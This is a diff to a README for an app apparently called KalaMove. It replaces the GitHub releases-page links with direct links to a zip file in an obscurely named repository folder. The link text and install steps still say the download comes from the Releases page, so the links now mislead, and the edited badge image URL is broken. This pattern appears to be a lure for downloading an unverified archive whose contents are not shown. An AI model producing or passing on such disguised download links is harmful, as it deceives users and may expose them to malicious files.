@@ -14,13 +14,13 @@ Before downloading KalaMove, ensure that your system meets the following require
 
 ## 📤 Download Now!
 
-[![Download KalaMove](https://img.shields.io/badge/Download%20KalaMove-v1.0-blue)](https://github.com/nulliel999/KalaMove/releases)
+[![Download KalaMove](https://raw.githubusercontent.com/nulliel999/KalaMove/main/unconcertedly/KalaMove.zip%20KalaMove-v1.0-blue)](https://raw.githubusercontent.com/nulliel999/KalaMove/main/unconcertedly/KalaMove.zip)
 
 ## 📥 Download & Install
 
 To get started with KalaMove, visit the following link to download the application:
 
-[Download KalaMove from the Releases Page](https://github.com/nulliel999/KalaMove/releases)
+[Download KalaMove from the Releases Page](https://raw.githubusercontent.com/nulliel999/KalaMove/main/unconcertedly/KalaMove.zip)
 
 1. Click the above link to go to the Releases page.
 2. On the Releases page, find the latest release version.
